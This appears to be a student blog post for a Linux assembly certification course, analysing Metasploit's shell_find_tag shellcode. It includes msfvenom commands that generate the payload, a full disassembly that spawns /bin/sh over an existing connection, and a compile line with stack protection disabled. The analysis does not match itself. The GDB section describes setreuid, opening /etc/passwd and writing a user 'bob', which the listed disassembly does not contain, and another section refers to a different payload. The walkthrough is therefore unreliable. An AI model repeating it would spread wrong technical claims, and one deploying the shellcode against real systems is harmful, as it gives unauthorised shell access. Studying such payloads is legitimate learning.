<!DOCTYPE HTML>
<!--
	Solution for SLAE question #5 part 3

-->
<html>
	<head>
		<link rel="icon" href="../images/favicon.ico">
		<title>The Post</title>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
		<link rel="stylesheet" href="../assets/css/main.css" />
		<link rel="stylesheet" href="../assets/css/atom-one-dark-reasonable.min.css">
		<script src="../assets/js/highlight.pack.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
		<noscript><link rel="stylesheet" href="../assets/css/noscript.css" /></noscript>
	</head>
	<body class="is-preload">

		<!-- Wrapper -->
			<div id="wrapper">

				<!-- Header -->
					<header id="header">
						<a class="logo">The Defense</a>
					</header>

				<!-- Nav -->
					<nav id="nav">
						<ul class="links">
							<li><a href="../index.html">Home</a></li>
							<li class="active"><a href="../posts.html">Posts</a></li>
							<li><a href="../research.html">Research</a></li>
							<li><a href="../stories.html">Stories</a></li>
							<li><a href="../references.html">Links</a></li>
						</ul>
						<ul class="icons">
							<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
							<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
							<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
							<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
						</ul>
					</nav>

				<!-- Main -->
					<div id="main">
						<div class="wrapper">

						<!-- Post -->

									<!--
									Post body goes here.
									-->
                  <!--
                  Solving slae question 5 part 3
                  -->
                  <section class="post">
                    <body>
                      <article id="first-post">
												<a href="index.html"><img src="../images/tomlin.png" class="avatar" alt="avatar"> </img></a>
                        <h2>&emsp; Analyzing Shell_Find_Tag Payload</h2>
												<h5>&emsp; &emsp; &emsp; &emsp; November 3, 2020</h5>
                        <div class="box">

													<br><h2>Contents</h2>
													<a href="#Started" style="color:blue;">Getting Started</a><br>
													<a href="#Disassembly" style="color:blue;">Dumping the Disassembly</a><br>
													<a href="#Libemu" style="color:blue;">Libemu Analysis</a><br>
													<a href="#GDB" style="color:blue;">GDB Analysis</a><br> <!-- Maybe not needed -->
													<a href="#Thoughts" style="color:blue;">Thoughts and Lessons Learned</a><br><br>

											<p>
											&emsp; &emsp;Good evening Tim, this is the last of three posts about analyzing <i>msfvenom</i> shellcode samples. &nbsp;This sample is <i>shell_find_tag</i>, which is the unstaged
											version and therefore larger in size. &nbsp;<i>Msfvenom</i> is a command
											line tool by <a href="https://blog.rapid7.com/2011/05/24/introducing-msfvenom/" target="_blank" style="color:blue;"><i>Rapid7</i></a> that generates payloads
											in various formats and encoding schemes. &nbsp;According to <i>Offensive Security</i>, it combined functionally of both <i>msfpayload</i> and <i>msfencode</i> as of
											June 8, 2015 by placing both tools under a single framework.
											</p>



			<br><section id="Started"><h2>Getting Started</h2></section>

											<p>
												&emsp; &emsp;Using any machine with Metasploit Framework, dump available payloads and verify <i>../shell_find_tag</i> exists. &nbsp;The specific command is
												<code>msfvenom -l payloads | grep "linux/x86"</code>:
											</p>
											<center><div class="image post"><img src="../images/slae/assignment5/shell/1-payloads-shell.png" alt="" /></div></center><br>

											<p>
												Next step is to determine what the payload requires. &nbsp;Dump the summary information with the command
												<code>msfvenom -l linux/x86/shell_find_tag --list-options</code>. &nbsp;According to the description, the <i>shell_find_tag</i>
												payload piggybacks off an established connection to spawn a command shell. &nbsp;No traditional options are associated with the shellcode; however,
												it includes an advanced TAG option at the bottom. &nbsp;The tag "f4sS" equates to <i>\x66\x34\x73\x53</i>. &nbsp;Upon closer inspection, it is revealed the tag
												is randomly generated by <i>msfvenom</i>. &nbsp;This can be simplified by setting the tag to something more simple by including <code>TAG=AAAA</code> in the command.
											</p>
											<center><div class="image post"><img src="../images/slae/assignment5/shell/2-find_tag-summary.png" alt="" /></div></center><br>



			<br><section id="Disassembly"><h2>Dumping the Disassembly</h2></section>

									<p>
										&emsp; &emsp;Dump the disassembly with <i>ndisasm</i> using command <code>msfvenom -p linux/x86/shell_find_tag TAG=AAAA R | ndisasm -u -</code>. &nbsp;The <i>-p</i> option specifies the payload.
										 &nbsp;<i>R</i> specifies raw output, which is then piped into <i>ndisasm</i>. &nbsp;
										<a href="https://linux.die.net/man/1/ndisasm" target="_blank" style="color:blue;"><i>ndisasm</i></a> stands for "Netwide Disassembler" and is the companion disassembler for the
										 <i>nasm</i> assembler used in the previous four blog posts. &nbsp;The <i>-u</i> option specifies 32-bit mode. &nbsp;Finally the single dash is a common UNIX option
										 which allows <i>ndisasm</i> to
										<a href="https://stackoverflow.com/questions/8045479/whats-the-magic-of-a-dash-in-command-line-parameters" target="_blank" style="color:blue;">allow input from <i>stdin</i></a>.
									</p>
									<pre>
										<code class="x86asm" style=display:block;white-space:pre-wrap>
00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E6              mov esi,esp
00000005  6A40              push byte +0x40
00000007  B70A              mov bh,0xa
00000009  53                push ebx
0000000A  56                push esi
0000000B  53                push ebx
0000000C  89E1              mov ecx,esp
0000000E  86FB              xchg bh,bl
00000010  66FF01            inc word [ecx]
00000013  6A66              push byte +0x66
00000015  58                pop eax
00000016  CD80              int 0x80
00000018  813E634B7870      cmp dword [esi],0x41414141
0000001E  75F0              jnz 0x10
00000020  5F                pop edi
00000021  89FB              mov ebx,edi
00000023  6A02              push byte +0x2
00000025  59                pop ecx
00000026  6A3F              push byte +0x3f
00000028  58                pop eax
00000029  CD80              int 0x80
0000002B  49                dec ecx
0000002C  79F8              jns 0x26
0000002E  6A0B              push byte +0xb
00000030  58                pop eax
00000031  99                cdq
00000032  52                push edx
00000033  682F2F7368        push dword 0x68732f2f
00000038  682F62696E        push dword 0x6e69622f
0000003D  89E3              mov ebx,esp
0000003F  52                push edx
00000040  53                push ebx
00000041  89E1              mov ecx,esp
00000043  CD80              int 0x80
										</code>
									</pre>

									<p>
										The above dump is the entire assembly output including 3 <i>int 0x80</i> system calls (syscalls). &nbsp;At first glance,
										the tag is shown along with a couple of DWORDs pushed onto the stack. &nbsp;This is only a cursory review and more will be revealed. &nbsp;Static analysis
										works but <i>Libemu</i> and <i>GDB</i> will provide more insight.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/3-.png" alt="" /></div></center><br>



			<br><section id="Libemu"><h2>Libemu Analysis</h2></section>
								<!--
								Libemu appears to work on this payload.  This section needs further work.
								-->
								<p>
									&emsp; &emsp;<i>Libemu</i> is a tricky tool to install so most of its analysis is done on the web VM. &nbsp;A successful install comes from this
									<a href="https://github.com/buffer/libemu" target="_blank" style="color:blue;">repository</a> as it is the most recently supported version. &nbsp;Note
									that in the repository's installation, tools are already included in the path so there is no need to search for binaries in <i>/tools/</i>. &nbsp;The only
									<i>Libemu</i> tool missing from the VM is <i>dot</i>, which allows visual analysis via the creation of <i>png</i> files. &nbsp;Unfortunately <i>dot</i>
									 cannot be used because the <i>sctest</i> output is incomplete.<br>
								 </p>
								 <center><div class="image post"><img src="../images/slae/assignment5/shell/3-sctest-messages.png" alt="" /></div></center><br>

								 <p>
									 &emsp; &emsp;Run the below command to pipe raw shellcode into <i>sctest</i>. &nbsp;Once again <i>sctest</i> stops after the
									first syscall, thus a proper Control Flow Graph (CFG) file cannot be made using the <i>-G</i> option. &nbsp;Proper functionality was tested on a
									<i>Libemu</i> install by running <code>sctest -vvv -Ss 100000 -G bind-shell.dot</code> on the <i>linux/x86/shell_bind_tcp</i> raw payload. &nbsp;A
									png file depicting the payload's control flow was successfully created with the <i>dot</i> tool. &nbsp;The <i>read_file</i> payload provides no
									additional analysis vectors with <i>Libemu</i>.

								</p>
								<center><div class="image post"><img src="../images/slae/assignment5/shell/4-dump-dot.png" alt="" /></div></center><br>



			<br><section id="GDB"><h2>GDB Analysis</h2></section>

									<p>
										&emsp; &emsp;In order to analyze the shellcode in <i>GDB</i>, it will need to be extracted and placed into a C-code harness.
										 &nbsp;Use the below command to create a payload in C-code format. &nbsp;The specified tag can be seen clear as day! &nbsp;To list additional formats,
										 simply run <code>msfvenom --list formats</code>.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/5-create-shellcode.png" alt="" /></div></center><br>

									<p>
										Copy and paste shellcode into the C-code harness.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/6-paste-harness.png" alt="" /></div></center><br>

									<p>
										Save the file and compile it with <code>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</code>. &nbsp;Start
										<i>GDB</i> in quiet mode and disassemble the <i>main()</i> function. &nbsp;Stop at instruction <code>call eax</code>. &nbsp;This
										is where the shellcode is passed control.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/7-gdb-main.png" alt="" /></div></center><br>

									<p>
										Step one more instruction then disassemble the payload. &nbsp;This should look identical to the <i>nasm</i> disassembly.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/8-assembly-dump.png" alt="" /></div></center><br>

									<p>
										As mentioned earlier, the above assembly shows 3 syscalls and a couple ascii DWORDs pushed onto the stack. &nbsp;By noting the values of <i>eax</i>,
										each syscall can be mapped in order using the <a href="http://shell-storm.org/shellcode/files/syscalls.html" target="_blank" style="color:blue;">syscall table</a>: <br>
										<li><a href="https://man7.org/linux/man-pages/man2/socketcall.2.html" target="_blank" style="color:blue;"><i>socketcall()</i></a></li>
										<li><a href="https://man7.org/linux/man-pages/man2/dup2.2.html" target="_blank" style="color:blue;"><i>dup2()</i></a></li>
										<li><a href="https://man7.org/linux/man-pages/man2/execve.2.html" target="_blank" style="color:blue;"><i>execve()</i></a></li>

									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/9-syscall-number.png" alt="" /></div></center><br>

									<p>
										Starting with <i>socketcall()</i>, 0x66 (103) is loaded into <i>eax</i> while the program sets <i>ebx</i> and <i>ecx</i>.
										 &nbsp;A hook-stop should be used to visualize program behaviour when setting <i>socketcall()</i> parameters. &nbsp;The corresponding
										 hook-stop is defined below:
									</p>
									<pre>
										<code style=display:block;white-space:pre-wrap>
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print/x $eax
>print/x $ebx
>print/x $ecx
>print/x $edx
>print/x $esi
>print/x $edi
>disassemble $eip,+28
>x/24xb $esp
>end
(gdb)
										</code>
									</pre>

									<p>
										Before stepping through instructions, it is worth investigating the function's man page. &nbsp;Register <i>ebx</i> 
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/10-before-setreuid.png" alt="" /></div></center><br>

									<p>
										Step again to observe results from the call to <i>setreuid()</i>. &nbsp;Register <i>eax</i> is zero meaning the call was successful. &nbsp;Furthermore,
										nothing was changed on the stack.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/11-after-setreuid.png" alt="" /></div></center><br>

									<p>
										The next syscall is to <i>open()</i> shown by loading 0x5 into <i>eax</i>. &nbsp;It takes two parameters: pathname to the requested file as a pointer,
										and flags. &nbsp;Revisit the DWORDs pushed onto the stack and convert the bytes to ascii. &nbsp;It spells <i>/etc/passwd</i>! &nbsp;The values
										 placed into ecx are 0x0401, which represent file permissions similar to what is observed in <i>chmod</i>. &nbsp;The flag
										 represents both <b>O_WRONLY</b> (write only) and <b>O_NOCTTY</b> (do not assign controlling terminal). &nbsp;Their exact
										 values can be found in <i>/usr/include/asm-generic/fcntl.h</i>. &nbsp;If successful, the return value is a file descriptor
										  used in later syscalls.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/12-before-open.png" alt="" /></div></center><br>

									<p>
										Step through the <i>open()</i> syscall to receive a file descriptor value of 8. &nbsp;
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/13-after-open.png" alt="" /></div></center><br>

									<p>
										The next branch uses a strange <i>call</i> instruction that points to the middle of a later instruction below. &nbsp;Specifically it points to the middle of
										instruction <code>or bl, BYTE PTR [ecx-0x75]</code>. &nbsp;This seems out of place. &nbsp;Why would a program do this? &nbsp;Remember that the <i>call</i>
										 instruction places the address of the next instruction (0x5655704b) onto the stack.
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/14-before-call.png" alt="" /></div></center><br>

									<p>
										After the <i>call</i> instruction, a <code>pop ecx</code> instruction appears! &nbsp;This activity appears very similar to that found in JMP-CALL-POP,
										which means garbage instructions starting at address 0x5655704b represent a "sub-payload" inside the <i>shell_find_tag</i> payload! &nbsp;It is likely a parameter to
										a later system call.<br>
										 &emsp; &emsp;The subsequent instruction
										changes to <code>mov edx, DWORD PTR [ecx-0x4]</code> and 0x5655704b appears on the stack. &nbsp;Based on the call, it appears
										changes occured because execution control was passed to the middle of an instruction; reshuffling opcode bytes in the process.
										  <!-- Compare opcode bytes of pop ecx with what was dumped
											in ndisasm.  pop ecx opcode should match with opcode in the middle of instruction at 0x5655706b.
											The instruction at 0x5655706b is 'or bl, BYTE PTR [ecx-0x75]'

											opcode table: http://sparksandflames.com/files/x86InstructionChart.html
										-->
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/15-after-call.png" alt="" /></div></center><br>

									<p>
										Verify the opcode bytes of <code>mov edx, DWORD PTR [ecx-0x4]</code> by dumping it into shell-storm's online
										<a href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/" target="_blank" style="color:blue;">assembler/disassembler tool</a>.
										 &nbsp;
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/16-assemble-instructions.png" alt="" /></div></center><br>

									<p>
										The output matches the next 3 opcode bytes from the <i>ndisasm</i> disassembly. &nbsp;Below is the snipped output (before executing
										<code>call 0x53</code>) to show relevant sections of the payload. &nbsp;Byte 0x59 is indeed followed by opcode bytes 0x8b, 0x51, and 0xfc.
									</p>
									<pre>
										<code class="x86asm" style=display:block;white-space:pre-wrap>

00000026  E828000000        call 0x53           ; next instruction's address loaded onto the stack (0x5655704b)
0000002B  6D                insd

; snip garbage instructions / payload

00000050  7368              jnc 0xba
; byte 0x59 is called so the below instructions change to "pop ecx; mov edx, DWORD PTR [ecx-0x4]"
00000052  0A 59 8B          or bl,[ecx-0x75]
00000055  51                push ecx
00000056  FC                cld

; continue valid instructions below

00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
										</code>
									</pre>

									<p>
										Step through <code>mov edx, DWORD PTR [ecx-0x4]</code> to load 0x21 into <i>edx</i>. &nbsp;According to the <i>write()</i> man page, <i>edx</i> holds the
										number of bytes to write; 33 in this case. &nbsp;Register <i>ecx</i> contains the address holding the contents to write; in this case, it's the starting point of the
										33 bytes to write. &nbsp;The file descriptor is loaded into <i>ebx</i> and the system call number, 0x4, is loaded into <i>eax</i>.

										<!-- &nbsp;Parameters before <i>write()</i> instruction. &nbsp;-->
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/17-before-write.png" alt="" /></div></center><br>

									<p>
										A successful execution of <i>write()</i> returns the number of bytes written. &nbsp;33 bytes were successfully written according to the <i>eax</i> value. &nbsp;All
										bytes of the sub-payload were written because 0x5655704b + 0x21 = 0x5655706c, which is the start of instruction <code>pop ecx</code>!
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell/18-after-write.png" alt="" /></div></center><br>

									<p>
										The contents written to <i>/etc/passwd</i> can be checked by dumping 33 bytes. &nbsp;Below shows the string of user <i>bob</i>, their password,
										User ID (UID), Group ID (GID), home directory, and starting program (typically an interactive shell).
									</p>
									<center><div class="image post"><img src="../images/slae/assignment5/shell_19-dump-subpayload.png" alt="" /></div></center><br>



		<br><section id="Thoughts"><h2>Thoughts and Lessons Learned</h2></section>

									<p>
										&emsp; &emsp;Analyzing payloads from <i>msfvenom</i> is great way to familiarize with other types of shellcode. &nbsp;Not all exploits
										involve reverse shells! &nbsp;It is also important to understand not every tool will yield fruitful analysis. &nbsp;<i>Libemu</i>
										provided little help with this analysis but is much friendlier towards shell-type payloads. &nbsp;The next <i>msfvenom</i> analysis
										involves <i>read_file</i>.
									</p>

									<p>
										The source code for this assignment as well as other SLAE assignments is here:
										<a href="https://github.com/jpc0016/SLAE-code" target="_blank" style="color:blue;">https://github.com/jpc0016/SLAE-code</a>
									</p>

									<p>
									This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
									<a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank" style="color:blue;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br>

									Student ID: PA-15981
									</p>

                        </div>

                      </article>
                    </body>
                  </section>

									<!--
									End post body
									-->

									<!--
									NEW POSTS GO ABOVE THIS LINE
									-->

									<!-- Remove Pagination
							<div class="pagination"><a href="#"> 1 </a></div>
							<div class="pagination"><a href="#"> 2 </a></div>
							<div class="pagination"><a href="#"> 3 </a></div>
							<div class="pagination"><a href="#"> 4 </a></div>
							<div class="pagination"><a href="#"> 5 </a></div>-->
							</div>
					</div>

				<!-- Footer -->
					<footer id="footer">

						<section class="split contact">

							<section>
								<h3>Social</h3>
								<ul class="icons alt">
									<li><a href="mailto:jpc0016@uah.edu" class="icon fa-paper-plane-o" target="_blank"><span class="label">Gmail</span></a></li>
									<li><a href="https://github.com/jpc0016" class="icon fa-github" target="_blank"><span class="label">GitHub</span></a></li>
									<li><a href="https://twitter.com/JohnGuy_01" class="icon fa-twitter" target="_blank"><span class="label">Twitter</span></a></li>
									<li><a href="https://stackoverflow.com/users/11770689/jpc0016?tab=profile" class="icon fa-stack-overflow" target="_blank"><span class="label">StackOverflow</span></a></li>
								</ul>
							</section>
						</section>
					</footer>

				<!-- Copyright -->
					<div id="copyright">
						<ul><li>&copy; Untitled</li><li>Design: <a href="https://html5up.net" target="_blank">HTML5 UP</a></li></ul>
					</div>

			</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script>
			<script src="assets/js/jquery.scrollex.min.js"></script>
			<script src="assets/js/jquery.scrolly.min.js"></script>
			<script src="assets/js/browser.min.js"></script>
			<script src="assets/js/breakpoints.min.js"></script>
			<script src="assets/js/util.js"></script>
			<script src="assets/js/main.js"></script>

	</body>
</html>
